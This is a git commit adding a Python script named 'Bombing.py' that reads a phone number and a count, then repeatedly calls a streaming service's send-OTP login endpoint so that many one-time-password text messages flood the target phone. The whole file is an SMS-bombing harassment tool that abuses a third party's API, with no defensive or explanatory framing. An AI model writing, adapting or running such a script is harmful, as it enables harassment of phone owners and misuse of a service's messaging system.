1a66d7d182937add930753fe24a51d79105d26e9
BDHB009 <montazuddin729@gmail.com>
2021-04-21 17:30:14 +0600

    Initial Commit

---
+++ Bombing.py
@@ -0,0 +1,11 @@
+number=str(input(" Enter The Number : "))
+
+amount=int(input(" Enter The Amount : "))
+
+api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
+
+for i in range(amount):
+	
+	requests.get(api)
+	
+	print(str(i+1)+" SMS Sent")
